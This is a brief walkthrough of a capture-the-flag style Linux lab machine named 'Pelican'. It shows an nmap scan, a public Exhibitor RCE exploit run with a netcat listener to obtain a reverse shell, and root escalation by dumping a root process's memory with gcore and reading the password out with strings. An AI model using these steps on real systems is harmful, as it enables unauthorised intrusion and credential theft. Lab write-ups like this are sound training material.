# 🦩 Pelican (Linux)

## 🌐 Initial Foothold

**Target IP:** `192.168.164.98`

Performed a full TCP port scan:

```bash
sudo nmap -Pn -n 192.168.164.98 -sC -sV -p- --open
```

🔁 **Note:** The machine needs to be reverted before exploitation.

Discovered **Exhibitor** web application and used the following exploit:

🔗 Exploit: [Exhibitor RCE](https://github.com/thehunt1s0n/Exihibitor-RCE?tab=readme-ov-file)

### 🚀 Exploitation Steps

```bash
# Start listener
rlwrap nc -lvnp 8080

# Run the exploit
./exploit.sh 192.168.164.98 8080 192.168.45.152 8080
```

🎉 Got a reverse shell.

---

## 🔐 Privilege Escalation

Enumerated with `sudo -l`, found root-accessible processes:

```bash
ps aux | grep root
```

Suspicious process found with PID `490`.

### 🧠 Dumping memory with gcore

```bash
sudo gcore 490
strings core.490
```

🔍 Extracted root password from the core dump!

```bash
su root
# Enter password retrieved from strings output
```

✅ Got root shell.

---

## 🛠️ Git Commands to Push Walkthrough

```bash
# Move the file to the linux walkthroughs folder
mv ~/Downloads/Pelican.md ~/Downloads/walkthroughs_project_template/linux/Pelican.md

# Change directory to the project root
cd ~/Downloads/walkthroughs_project_template

# Add all changes to git
git add .

# Commit the changes with a descriptive message
git commit -m "Added Pelican (Linux) walkthrough"

# Push the commit to GitHub
git push
```
